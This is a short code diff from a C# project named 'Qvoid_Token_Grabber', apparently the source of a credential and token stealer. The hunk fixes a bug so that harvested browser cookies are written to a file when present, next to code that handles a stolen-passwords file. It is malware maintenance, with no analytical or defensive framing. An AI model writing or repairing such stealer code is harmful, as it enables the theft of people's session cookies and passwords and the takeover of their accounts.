@@ -506,7 +506,7 @@ namespace Qvoid_Token_Grabber
                         File.Delete(PasswordsPath);
                     }
 
-                    if (Passwords != "------ Cookies ------")
+                    if (Cookies != "------ Cookies ------")
                     {
                         Thread.Sleep(10);
                         File.WriteAllText(CookiesPath, Cookies);
